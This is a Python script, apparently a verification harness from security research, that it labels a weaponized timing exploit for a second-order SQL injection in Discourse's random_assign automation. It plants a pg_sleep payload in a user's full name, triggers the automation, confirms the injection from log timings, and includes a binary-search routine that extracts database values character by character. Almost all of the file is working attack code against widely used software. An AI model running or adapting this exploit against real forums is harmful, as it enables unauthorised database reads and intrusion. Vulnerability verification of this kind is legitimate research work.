#!/usr/bin/env python3
import argparse
import datetime
import json
import os
import re
import sys
import time
from pathlib import Path

import requests


DEFAULT_BASE = "http://wsl.evm.pics:31655"
FINDING_ID = "a3063a05b55c9a8f"
SEEDED_TOPIC_ID = 35


def load_accounts(path):
    candidates = []
    if path:
        candidates.append(Path(path))
    candidates.extend(
        [
            Path("workspace/_accounts.json"),
            Path(__file__).resolve().parents[2] / "_accounts.json",
        ],
    )
    for candidate in candidates:
        if candidate.exists():
            return {a["username"]: a for a in json.loads(candidate.read_text())}
    raise SystemExit("FAIL could not find workspace/_accounts.json; pass --accounts")


def default_workspace_file(name):
    candidates = [Path("workspace") / name, Path(__file__).resolve().parents[2] / name]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    return None


def session_from_jar(base, jar_path):
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
    for line in Path(jar_path).read_text().splitlines():
        if not line or line.startswith("# ") or line.startswith("# Netscape"):
            continue
        http_only = line.startswith("#HttpOnly_")
        if http_only:
            line = line[len("#HttpOnly_") :]
        parts = line.split("\t")
        if len(parts) != 7:
            continue
        domain, _include_subdomains, path, secure, _expires, name, value = parts
        session.cookies.set(name, value, domain=domain, path=path, secure=(secure.upper() == "TRUE"))
    response = session.get(f"{base}/session/csrf", timeout=10)
    response.raise_for_status()
    session.headers.update({"X-CSRF-Token": response.json()["csrf"]})
    return session


def login(base, account):
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
    csrf = session.get(f"{base}/session/csrf", timeout=10).json()["csrf"]
    response = session.post(
        f"{base}/session",
        data={"login": account["username"], "password": account["password"]},
        headers={"X-CSRF-Token": csrf},
        timeout=10,
    )
    if response.status_code >= 400:
        raise SystemExit(
            f"FAIL login for {account['username']} returned {response.status_code}: {response.text[:200]}",
        )
    session.headers.update({"X-CSRF-Token": csrf})
    return session


def session_for(base, accounts, username, jar_path):
    if jar_path:
        return session_from_jar(base, jar_path)
    return login(base, accounts[username])


def ensure_visible_settings(base, admin):
    for name in ("assign_enabled", "discourse_automation_enabled"):
        response = admin.put(f"{base}/admin/site_settings/{name}.json", data={name: "true"}, timeout=10)
        if response.status_code not in (200, 204):
            raise SystemExit(
                f"FAIL could not enable {name}: HTTP {response.status_code} {response.text[:200]}",
            )


def choose_category(base, admin):
    response = admin.get(f"{base}/categories.json", timeout=10)
    response.raise_for_status()
    for category in response.json().get("category_list", {}).get("categories", []):
        if not category.get("read_restricted") and category.get("slug") != "uncategorized":
            return category["id"]
    raise SystemExit("FAIL no public non-reserved category available")


def make_payload(condition, sleep_seconds, marker):
    payload = (
        "x}'::text[]) WITH ORDINALITY t(username,ord) ON true "
        f"JOIN LATERAL(SELECT CASE WHEN {condition} "
        f"THEN pg_sleep({sleep_seconds:g}) ELSE pg_sleep(0) END)s ON true --{marker}"
    )
    if len(payload) > 255:
        raise SystemExit(f"FAIL payload is {len(payload)} bytes; User#name limit is 255")
    return payload


def log_times(base, admin, marker):
    response = admin.post(f"{base}/logs/messages.json", data={"search": marker}, timeout=15)
    if response.status_code != 200:
        return []
    times = []
    for message in response.json().get("messages", []):
        text = message.get("message", "")
        match = re.search(r"User Pluck \(([0-9.]+)ms\)", text)
        if match:
            times.append({"ms": float(match.group(1)), "message": text[:900]})
    return times


def seeded_log_times(base, admin, started_ms):
    response = admin.post(f"{base}/logs/messages.json", data={"search": "pg_sleep(3)"}, timeout=15)
    if response.status_code != 200:
        return []
    times = []
    for message in response.json().get("messages", []):
        if int(message.get("timestamp") or 0) < started_ms - 1000:
            continue
        text = message.get("message", "")
        match = re.search(r"User Pluck \(([0-9.]+)ms\)", text)
        if match:
            times.append({"ms": float(match.group(1)), "message": text[:900]})
    return times


def create_topic(base, admin, label):
    stamp = int(time.time())
    response = admin.post(
        f"{base}/posts.json",
        data={
            "title": f"TF D random assign SQLi {label} {stamp}",
            "raw": f"tf d random assign sqli {label} {stamp}",
            "category": choose_category(base, admin),
        },
        timeout=15,
    )
    if response.status_code >= 400:
        raise SystemExit(f"FAIL creating topic: HTTP {response.status_code} {response.text[:300]}")
    topic_id = response.json().get("topic_id")
    if not topic_id:
        raise SystemExit(f"FAIL no topic_id in create response: {response.text[:300]}")
    return topic_id


def create_automation(base, admin, topic_id, label):
    response = admin.post(
        f"{base}/admin/plugins/automation/automations.json",
        json={"automation": {"script": "random_assign", "trigger": "recurring"}},
        timeout=15,
    )
    if response.status_code >= 400:
        raise SystemExit(f"FAIL creating automation: HTTP {response.status_code} {response.text[:300]}")
    automation_id = response.json()["automation"]["id"]
    start = (datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=1)).isoformat()
    fields = [
        {"name": "assignees_group", "component": "group", "target": "script", "metadata": {"value": 3}},
        {
            "name": "assigned_topic",
            "component": "text",
            "target": "script",
            "metadata": {"value": str(topic_id)},
        },
        {
            "name": "recurrence",
            "component": "period",
            "target": "trigger",
            "metadata": {"value": {"interval": 1, "frequency": "day"}},
        },
        {"name": "start_date", "component": "date_time", "target": "trigger", "metadata": {"value": start}},
    ]
    response = admin.put(
        f"{base}/admin/plugins/automation/automations/{automation_id}.json",
        json={
            "automation": {
                "name": f"TF D random assign SQLi {label} {int(time.time())}",
                "script": "random_assign",
                "trigger": "recurring",
                "enabled": True,
                "fields": fields,
            },
        },
        timeout=15,
    )
    if response.status_code >= 400:
        raise SystemExit(f"FAIL updating automation: HTTP {response.status_code} {response.text[:500]}")
    return automation_id


def poll_automation_stats(base, admin, automation_id, wait_seconds=45):
    for _ in range(wait_seconds):
        time.sleep(1)
        response = admin.get(f"{base}/admin/plugins/automation/automations.json", timeout=15)
        response.raise_for_status()
        for automation in response.json().get("automations", []):
            if automation.get("id") == automation_id:
                stats = automation.get("stats", {}).get("last_day", {})
                if stats.get("total_runs", 0) >= 1:
                    return stats
    return {}


def trigger_seeded_topic(base, admin, topic_id, threshold_seconds):
    automation_id = create_automation(base, admin, topic_id, f"seeded{topic_id}")
    try:
        started_ms = int(time.time() * 1000)
        response = admin.post(f"{base}/automations/{automation_id}/trigger.json", timeout=15)
        if response.status_code >= 400:
            raise SystemExit(f"FAIL triggering automation: HTTP {response.status_code} {response.text[:300]}")
        stats = {}
        log_hits = []
        for _ in range(45):
            time.sleep(1)
            log_hits = seeded_log_times(base, admin, started_ms)
            if log_hits:
                break
            stats = poll_automation_stats(base, admin, automation_id, wait_seconds=1)
            if stats.get("total_runs", 0) >= 1:
                break
        max_run = float(stats.get("max_run_time") or 0)
        max_log_ms = max((hit["ms"] for hit in log_hits), default=0)
        print(
            f"seeded_topic={topic_id} automation_id={automation_id} "
            f"stats={json.dumps(stats, sort_keys=True)} log_ms={max_log_ms:.1f}",
        )
        if max_log_ms >= threshold_seconds * 1000 * 0.8:
            print("PASS seeded action_code_who payload executed; Logster shows injected pg_sleep")
            print("evidence_sql=" + log_hits[0]["message"].replace("\n", " ")[:900])
            return {"automation_id": automation_id, "topic_id": topic_id, "stats": stats, "log_hits": log_hits}
        if stats.get("total_errors", 0) == 0 and max_run >= threshold_seconds:
            print("PASS seeded action_code_who payload executed; automation runtime shows injected pg_sleep")
            return {"automation_id": automation_id, "topic_id": topic_id, "stats": stats, "log_hits": log_hits}
        raise SystemExit(
            "FAIL no seeded timing proof: "
            f"max_run_time={max_run:.3f}s total_errors={stats.get('total_errors')} log_ms={max_log_ms:.1f}",
        )
    finally:
        try:
            admin.delete(f"{base}/admin/plugins/automation/automations/{automation_id}.json", timeout=15)
        except requests.RequestException:
            pass


def trigger_condition(base, admin, user, username, condition, sleep_seconds, label):
    marker = f"tfD{int(time.time() * 1000) % 100000000}{re.sub('[^A-Za-z0-9]', '', label)[:16]}"
    payload = make_payload(condition, sleep_seconds, marker)
    response = user.put(f"{base}/u/{username}.json", data={"name": payload}, timeout=10)
    if response.status_code >= 400:
        raise SystemExit(f"FAIL setting payload full name: HTTP {response.status_code} {response.text[:200]}")

    topic_id = create_topic(base, admin, label)
    response = admin.put(
        f"{base}/assign/assign.json",
        data={"target_id": topic_id, "target_type": "Topic", "username": username, "should_notify": "false"},
        timeout=15,
    )
    if response.status_code >= 400:
        raise SystemExit(f"FAIL assigning payload user: HTTP {response.status_code} {response.text[:300]}")

    automation_id = create_automation(base, admin, topic_id, label)
    try:
        response = admin.post(f"{base}/automations/{automation_id}/trigger.json", timeout=15)
        if response.status_code >= 400:
            raise SystemExit(f"FAIL triggering automation: HTTP {response.status_code} {response.text[:300]}")

        times = []
        for _ in range(35):
            time.sleep(1)
            times = log_times(base, admin, marker)
            if times:
                break
        if not times:
            raise SystemExit(
                "FAIL no marked SQL query appeared in Logster; hidden prioritize_full_name_in_ux may be disabled",
            )
        max_ms = max(t["ms"] for t in times)
        return {
            "label": label,
            "marker": marker,
            "topic_id": topic_id,
            "automation_id": automation_id,
            "payload_length": len(payload),
            "max_ms": max_ms,
            "times": times,
        }
    finally:
        try:
            admin.delete(f"{base}/admin/plugins/automation/automations/{automation_id}.json", timeout=15)
        except requests.RequestException:
            pass


def ascii_gt(base, admin, user, username, expr, pos, threshold, sleep_seconds):
    condition = f"ascii(substr(({expr})::text,{pos},1))>{threshold}"
    result = trigger_condition(base, admin, user, username, condition, sleep_seconds, f"gt{pos}_{threshold}")
    return result["max_ms"] >= sleep_seconds * 1000 * 0.6, result


def extract_chars(base, admin, user, username, expr, count, sleep_seconds):
    chars = []
    evidence = []
    for pos in range(1, count + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            is_gt, result = ascii_gt(base, admin, user, username, expr, pos, mid, sleep_seconds)
            evidence.append(result)
            if is_gt:
                lo = mid + 1
            else:
                hi = mid
        chars.append(chr(lo))
    return "".join(chars), evidence


def main():
    parser = argparse.ArgumentParser(description="Weaponized timing exploit for Discourse random_assign SQLi")
    parser.add_argument("base", nargs="?", default=DEFAULT_BASE)
    parser.add_argument("--accounts")
    parser.add_argument("--admin-user", default="user1")
    parser.add_argument("--attacker-user", default="testuser")
    parser.add_argument("--admin-jar")
    parser.add_argument("--attacker-jar")
    parser.add_argument("--mode", choices=("seeded", "conditional"), default="seeded")
    parser.add_argument("--seeded-topic-id", type=int, default=SEEDED_TOPIC_ID)
    parser.add_argument("--sleep", type=float, default=2.0)
    parser.add_argument("--seeded-threshold", type=float, default=3.0)
    parser.add_argument("--extract-chars", type=int, default=0)
    parser.add_argument("--expr", default="current_database()")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    accounts = load_accounts(args.accounts)
    admin_jar = args.admin_jar or default_workspace_file("user1.jar")
    attacker_jar = args.attacker_jar or default_workspace_file("testuser.jar")
    admin = session_for(base, accounts, args.admin_user, admin_jar)
    attacker = None
    original_name = None

    try:
        ensure_visible_settings(base, admin)
        if args.mode == "seeded" and args.extract_chars == 0:
            result = trigger_seeded_topic(base, admin, args.seeded_topic_id, args.seeded_threshold)
            print("max_impact=stored second-order SQL execution through random_assign automation")
            print("evidence_stats=" + json.dumps(result["stats"], sort_keys=True))
            return

        attacker = session_for(base, accounts, args.attacker_user, attacker_jar)
        current = attacker.get(f"{base}/session/current", timeout=10)
        if current.ok:
            original_name = current.json().get("current_user", {}).get("name")

        true_condition = "ascii(substr(current_database(),1,1))>99"
        false_condition = "ascii(substr(current_database(),1,1))>200"
        true_result = trigger_condition(base, admin, attacker, args.attacker_user, true_condition, args.sleep, "true")
        false_result = trigger_condition(base, admin, attacker, args.attacker_user, false_condition, args.sleep, "false")
        threshold_ms = args.sleep * 1000 * 0.6
        print(
            f"true_case max_ms={true_result['max_ms']:.1f} marker={true_result['marker']} "
            f"topic={true_result['topic_id']}",
        )
        print(
            f"false_case max_ms={false_result['max_ms']:.1f} marker={false_result['marker']} "
            f"topic={false_result['topic_id']}",
        )
        if true_result["max_ms"] < threshold_ms or false_result["max_ms"] >= threshold_ms:
            raise SystemExit("FAIL conditional timing did not separate true and false cases")

        if args.extract_chars > 0:
            extracted, evidence = extract_chars(
                base,
                admin,
                attacker,
                args.attacker_user,
                args.expr,
                args.extract_chars,
                args.sleep,
            )
            print(f"extracted expr_prefix={json.dumps(extracted)} expr={args.expr!r} probes={len(evidence)}")

        print("PASS data-dependent SQL execution reached through stored full-name payload")
        print("evidence_true_sql=" + true_result["times"][0]["message"].replace("\n", " ")[:900])
        print("evidence_false_sql=" + false_result["times"][0]["message"].replace("\n", " ")[:900])
    finally:
        if attacker is not None and original_name is not None and os.environ.get("KEEP_PAYLOAD", "0") != "1":
            try:
                attacker.put(f"{base}/u/{args.attacker_user}.json", data={"name": original_name}, timeout=10)
            except requests.RequestException:
                pass


if __name__ == "__main__":
    main()
